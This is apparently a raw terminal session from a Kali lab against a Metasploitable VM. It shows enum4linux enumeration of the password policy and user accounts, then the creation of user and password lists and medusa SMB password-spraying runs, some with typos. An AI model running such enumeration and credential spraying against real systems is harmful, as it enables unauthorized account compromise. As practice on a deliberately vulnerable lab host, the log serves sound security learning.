[+] Password Info for Domain: METASPLOITABLE

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: Not Set
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: Not Set



[+] Retieved partial password policy with rpcclient:                                                                                  
                                                                                                                                      
                                                                                                                                      
Password Complexity: Disabled                                                                                                         
Minimum Password Length: 0


 ======================================( Groups on 192.168.213.3 )======================================
                                                                                                                                      
                                                                                                                                      
[+] Getting builtin groups:                                                                                                           
                                                                                                                                      
                                                                                                                                      
[+]  Getting builtin group memberships:                                                                                               
                                                                                                                                      
                                                                                                                                      
[+]  Getting local groups:                                                                                                            
                                                                                                                                      
                                                                                                                                      
[+]  Getting local group memberships:                                                                                                 
                                                                                                                                      
                                                                                                                                      
[+]  Getting domain groups:                                                                                                           
                                                                                                                                      
                                                                                                                                      
[+]  Getting domain group memberships:                                                                                                
                                                                                                                                      
                                                                                                                                      
 ==================( Users on 192.168.213.3 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                      
                                                                                                                                      
[I] Found new SID:                                                                                                                    
S-1-5-21-1042354039-2475377354-766472396                                                                                              

[+] Enumerating users using SID S-1-5-21-1042354039-2475377354-766472396 and logon username '', password ''                           
                                                                                                                                      
S-1-5-21-1042354039-2475377354-766472396-500 METASPLOITABLE\Administrator (Local User)                                                
S-1-5-21-1042354039-2475377354-766472396-501 METASPLOITABLE\nobody (Local User)
S-1-5-21-1042354039-2475377354-766472396-512 METASPLOITABLE\Domain Admins (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-513 METASPLOITABLE\Domain Users (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-514 METASPLOITABLE\Domain Guests (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1000 METASPLOITABLE\root (Local User)
S-1-5-21-1042354039-2475377354-766472396-1001 METASPLOITABLE\root (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1002 METASPLOITABLE\daemon (Local User)
S-1-5-21-1042354039-2475377354-766472396-1003 METASPLOITABLE\daemon (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1004 METASPLOITABLE\bin (Local User)
S-1-5-21-1042354039-2475377354-766472396-1005 METASPLOITABLE\bin (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1006 METASPLOITABLE\sys (Local User)
S-1-5-21-1042354039-2475377354-766472396-1007 METASPLOITABLE\sys (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1008 METASPLOITABLE\sync (Local User)
S-1-5-21-1042354039-2475377354-766472396-1009 METASPLOITABLE\adm (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1010 METASPLOITABLE\games (Local User)
S-1-5-21-1042354039-2475377354-766472396-1011 METASPLOITABLE\tty (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1012 METASPLOITABLE\man (Local User)
S-1-5-21-1042354039-2475377354-766472396-1013 METASPLOITABLE\disk (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1014 METASPLOITABLE\lp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1015 METASPLOITABLE\lp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1016 METASPLOITABLE\mail (Local User)
S-1-5-21-1042354039-2475377354-766472396-1017 METASPLOITABLE\mail (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1018 METASPLOITABLE\news (Local User)
S-1-5-21-1042354039-2475377354-766472396-1019 METASPLOITABLE\news (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1020 METASPLOITABLE\uucp (Local User)
S-1-5-21-1042354039-2475377354-766472396-1021 METASPLOITABLE\uucp (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1025 METASPLOITABLE\man (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1026 METASPLOITABLE\proxy (Local User)
S-1-5-21-1042354039-2475377354-766472396-1027 METASPLOITABLE\proxy (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1031 METASPLOITABLE\kmem (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1041 METASPLOITABLE\dialout (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1043 METASPLOITABLE\fax (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1045 METASPLOITABLE\voice (Domain Group)
S-1-5-21-1042354039-2475377354-766472396-1049 METASPLOITABLE\cdrom (Domain Group)

 ===============================( Getting printer info for 192.168.213.3 )===============================
                                                                                                                                      
No printers returned.                                                                                                                 


enum4linux complete on Fri Nov 21 21:14:00 2025

                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ less enum4_output.txt
"enum4_output.txt" may be a binary file.  See it anyway? 
                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ uit
Command 'uit' not found, did you mean:
  command 'uil' from deb uil
  command 'luit' from deb luit
  command 'uif' from deb uif
  command 'vit' from deb vit
  command 'uic' from deb qtchooser
  command 'wit' from deb wit
  command 'git' from deb git
  command 'ui' from deb userinfo
Try: sudo apt install <deb name>
                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ echo -e "user\nmfadmin\nservice" > smb_users.txt  
                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.213.3 -U smb_users.txt -P senhas_spary.txt -Msmbnt -t 2 -t 50
Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

FATAL: Failed to open file senhas_spary.txt - No such file or directory
                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.213.3 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 T 50 

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-21 21:37:01 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: password (1 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: 123456 (2 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 0 complete) Password: msfadmin (3 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 1 complete) Password: Welcome123 (4 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: mfadmin (2 of 3, 1 complete) Password: password (1 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: mfadmin (2 of 3, 1 complete) Password: 123456 (2 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: mfadmin (2 of 3, 1 complete) Password: Welcome123 (3 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: mfadmin (2 of 3, 2 complete) Password: msfadmin (4 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: password (1 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: Welcome123 (2 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: service (3 of 3, 2 complete) Password: msfadmin (3 of 4 complete)
2025-11-21 21:37:02 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: 123456 (4 of 4 complete)
                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ medusa -h 192.168.213.3 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 50

Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

2025-11-21 21:39:58 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 2 complete) Password: password (1 of 4 complete)
2025-11-21 21:39:58 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: 123456 (2 of 4 complete)
2025-11-21 21:39:58 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: Welcome123 (3 of 4 complete)
2025-11-21 21:39:58 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: mfadmin (2 of 3, 3 complete) Password: 123456 (1 of 4 complete)
2025-11-21 21:39:58 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: user (1 of 3, 3 complete) Password: msfadmin (4 of 4 complete)
2025-11-21 21:39:59 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: mfadmin (2 of 3, 3 complete) Password: msfadmin (2 of 4 complete)
2025-11-21 21:39:59 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: mfadmin (2 of 3, 3 complete) Password: Welcome123 (3 of 4 complete)
2025-11-21 21:39:59 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: Welcome123 (1 of 4 complete)
2025-11-21 21:39:59 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: mfadmin (2 of 3, 3 complete) Password: password (4 of 4 complete)
2025-11-21 21:39:59 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: password (2 of 4 complete)
2025-11-21 21:39:59 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: 123456 (3 of 4 complete)
2025-11-21 21:39:59 ACCOUNT CHECK: [smbnt] Host: 192.168.213.3 (1 of 1, 0 complete) User: service (3 of 3, 3 complete) Password: msfadmin (4 of 4 complete)
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ ping -c 3 192.168.213.3
PING 192.168.213.3 (192.168.213.3) 56(84) bytes of data.
64 bytes from 192.168.213.3: icmp_seq=1 ttl=64 time=15.9 ms
64 bytes from 192.168.213.3: icmp_seq=2 ttl=64 time=5.37 ms
64 bytes from 192.168.213.3: icmp_seq=3 ttl=64 time=3.53 ms

--- 192.168.213.3 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2444ms
rtt min/avg/max/mdev = 3.528/8.252/15.863/5.433 ms
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ 

